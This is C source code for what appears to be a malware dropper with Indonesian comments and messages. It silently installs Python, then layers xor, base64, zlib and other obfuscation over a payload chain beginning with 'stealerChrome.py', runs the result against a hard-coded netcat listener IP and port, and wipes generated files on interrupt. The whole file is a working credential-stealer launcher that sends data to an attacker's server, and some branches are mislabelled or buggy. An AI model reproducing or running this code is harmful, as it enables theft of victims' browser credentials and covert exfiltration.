#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>

typedef struct {
    char *mode;
    char *payload;
} Payload;

int check() {
    FILE *fp;
    char command[50];
    char result[10];

    snprintf(command, sizeof(command), "python.exe --version");
    fp = popen(command, "r");

    if (fp == NULL) {
        return -1;
    }

    fgets(result, sizeof(result), fp);
    pclose(fp);

    if (strstr(result, "Python") != NULL) {
        return 1;
    } else {
        return 0;
    }
}


void notif(const char *sv, const int pr, const char *msg) {
    char command[500];
    snprintf(command, sizeof(command), "python.exe notif.py %s %d %s", sv, pr, msg);
    system(command);
    sleep(1);
}

void generate(Payload *payloads, int numModes, int numPayloads, const char *s, const int p) {
    printf("\nProses generate payload\n");
    for (int i = 0; i < numModes; i++) {
        if (payloads[i].mode == "done") {
            break;
        }
        char command[150];
        snprintf(command, sizeof(command), "python.exe oliner.py %s %d %s %s %s", s, p, payloads[i].mode, payloads[i].payload, payloads[i + 1].payload);
        system(command);
        sleep(1);
    }
    printf("\nGenerate payload selesai\n");
}

void delete() {
    char command[150];
    snprintf(command, sizeof(command), "python.exe oliner.py -d");
    system(command);
    sleep(1);
}

void run(const char *s, const int p) {
    printf("\nMenjalankan payload\n");
    char command[150];
    snprintf(command, sizeof(command), "python.exe iniPAYLOADnya.py %s %d", s, p);
    system(command);
    sleep(1);
}

void install(const char *s, const int p) {
    printf("\nInstall modul\n");
    char command[150];
    snprintf(command, sizeof(command), "python.exe -m pip install -r req.txt");
    system(command);
    sleep(1);
}

void handler() {
    delete();
    exit(0);
}

void exitt() {
    exit(0);
}

void os(const char *s, const int p) {
    #ifdef _WIN32
        system("powershell -Command \"& {Start-BitsTransfer -Source 'https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe' -Destination 'python-installer.exe'; Start-Process 'python-installer.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -NoNewWindow -Wait}\"");
    #elif __linux__
        system("/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"");
        system("brew install python");
    #elif __APPLE__
        FILE *fp;
        char result[128];
        fp = popen("which apt", "r");
        if (fp == NULL) {
            notif(s, p, "Gagal-cek-apt\n");
            return;
        }
        if (fgets(result, sizeof(result), fp) != NULL) {
            system("sudo apt update && sudo apt install -y python3");
            pclose(fp);
            return;
        }
        pclose(fp);

        fp = popen("which yum", "r");
    if (fp == NULL) {
        notif(s, p, "Gagal-cek-yum\n");
        return;
    }
    if (fgets(result, sizeof(result), fp) != NULL) {
        system("sudo yum install -y python3");
        pclose(fp);
        return;
    }
    pclose(fp);

    fp = popen("which pacman", "r");
    if (fp == NULL) {
        notif(s, p, "Gagal-cek-pacman\n");
        return;
    }
    if (fgets(result, sizeof(result), fp) != NULL) {
        system("sudo pacman -Sy python");
        pclose(fp);
        return;
    }
    pclose(fp);
    #else
        notif(s, p, "Jenis-sistem-operasi-tidak-ditemukan\n");
    #endif
}

int main() {
    signal(SIGINT, exitt);
    int python = check();
    const char *server = "192.168.55.1"; // Silahkan sesuaikan dengan IP server netcat yang diinginkan
    const int port = 5555; // Silahkan sesuaikan dengan port server netcat yang diinginkan

    if (python) {
        delete();
        signal(SIGINT, handler);

        Payload payloads[] = {
            {"xor", "stealerChrome.py"},
            {"ascii85", "payload1.py"},
            {"zlib", "payload2.py"},
            {"base64", "payload3.py"},
            {"binary", "payload4.py"},
            {"base16", "payload5.py"},
            {"base32", "payload6.py"},
            {"base85", "payload7.py"},
            {"unicode", "payload8.py"},
            {"done", "iniPAYLOADnya.py"}
        };
        int numModes = sizeof(payloads) / sizeof(payloads[0]);
        install(server, port);
        generate(payloads, numModes, numModes, server, port);
        run(server, port);
    } else {
        os(server, port);
    }

    return 0;
}